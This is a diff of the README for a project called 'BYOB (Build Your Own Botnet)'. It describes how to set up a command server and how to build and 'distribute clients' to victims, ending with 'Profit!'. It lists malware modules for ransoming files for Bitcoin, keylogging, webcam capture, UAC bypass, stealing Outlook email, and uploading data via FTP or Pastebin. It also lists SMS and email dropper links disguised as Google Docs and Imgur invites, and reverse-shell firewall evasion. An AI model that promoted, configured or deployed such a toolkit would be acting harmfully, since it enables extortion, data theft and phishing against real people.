@@ -1,22 +1,19 @@
 # BYOB (Build Your Own Botnet)  
-
 [![license](https://img.shields.io/github/license/mashape/apistatus.svg)](https://github.com/colental/byob/blob/master/LICENSE)
-
-## Setup
-
-### Installation
-`git clone https://github.com/colental/byob`
-
-### Configuration
-Edit the [configuration](config.ini) file
-to add any API Keys or login credentials
+## Usage
+1) `git clone https://github.com/colental/byob`
+2) Edit the [configuration](config.ini) file to add any API Keys or login credentials 
 that you want to use for the following features:
-- `mysql_host`, `mysql_user`, `mysql_password`
-- `ftp_host`, `ftp_user`, `ftp_password`
-- `twilio_account_sid`, `twilio_api_key`, `twilio_auth_token`
-- `pastebin_dev_key` 
-- `imgur_api_key` 
-- `bitcoin_wallet_address`
+- **MySQL**: `mysql_host`, `mysql_user`, `mysql_password`
+- **FTP**: `ftp_host`, `ftp_user`, `ftp_password`
+- **Twilio**: `twilio_account_sid`, `twilio_api_key`, `twilio_auth_token`
+- **Pastebin**: `pastebin_dev_key` 
+- **Imgur**: `imgur_api_key` 
+- **Bitcoin**: `bitcoin_wallet_address`
+3) Create server
+4) Distribute clients
+5) Profit!
+____________________________________________
 
 ## Server
 `server.py <-p/--port PORT> [-c/--config CONFIG] [-h/--help] [-d/--debug]` 
@@ -31,30 +28,26 @@ that you want to use for the following features:
 - `exit/quit [Y/N]`: exit the server and optionally keep sessions alive
 
 ### Database
-- `clients`: adds new clients, manages current clients, removes old clients
-- `sessions`: manages active online sessions and saves offline sessions
-- `tasks`: records issued tasks and updates entries upon receiving results
---------------------------------------------------
+- **Clients**: adds new clients, manages current clients, removes old clients
+- **Sessions**: manages active online sessions and saves offline sessions
+- **Tasks**: records issued tasks and updates entries upon receiving results
+____________________________________________
 
 ## Client
-`client.py <py/exe/app> [options]`
-- `py`: core python stager
-- `exe`: executable binary in native format of host platform (*Windows + Linux*)
-- `app`: bundled application (*Mac OS X*)
-- `-n/--name NAME`: filename of the generated client
-- `-i/--icon ICON`: icon image file for generated client (default: Java)
+`client.py <py|exe|app> [-n/--name NAME] [-i/--icon ICON]`
 
 ### Modules
-- **Ransom Files**:        encrypt host files and ransom them to the user for Bitcoin
-- **Upload Files**:        automatically upload valuable data via FTP or Pastebin
-- **Webcam**:              live stream from webcam or auto-upload captured images/videos
-- **Keylogger**:           log the keystrokes, clipboard, and name of the active window
-- **Screenshot**:          snap screenshots of the current users desktop 
-- **Privileges**:          bypass UAC to gain administrator privileges (Windows platforms)
-- **Packet Sniffer**:      capture logs of host network traffic (Linux & Mac OSX)
-- **Port Scanner**:        scan the local network to map online hosts and open ports
-- **Email**:               automated mass email dropper links disguised as Google Docs invite
-- **Phone**:               automated mass text (SMS) dropper links disguised as Imgur links
+- **Ransom Files**  encrypt host files and ransom them to the user for Bitcoin
+- **Upload Files**: automatically upload valuable data via FTP or Pastebin
+- **Webcam**: live stream from webcam or auto-upload captured images/videos
+- **Keylogger**: log the keystrokes, clipboard, and name of the active window
+- **Screenshot**: snap screenshots of the current users desktop 
+- **Privileges**: bypass UAC to gain administrator privileges (Windows platforms)
+- **Packet Sniffer**: capture logs of host network traffic (Linux & Mac OSX)
+- **Port Scanner**: scan the local network to map online hosts and open ports
+- **Outlook**: upload all emails or only emails matching keywords or phrases
+- **Email Distribution**: automated email dropper links disguised as Google Docs invite
+- **Phone Distribution**: automated text (SMS) dropper links disguised as Imgur links
 
 ### Stealth
 - **Firewall evasion**     reverse TCP shells use outgoing connections not filtered by firewalls
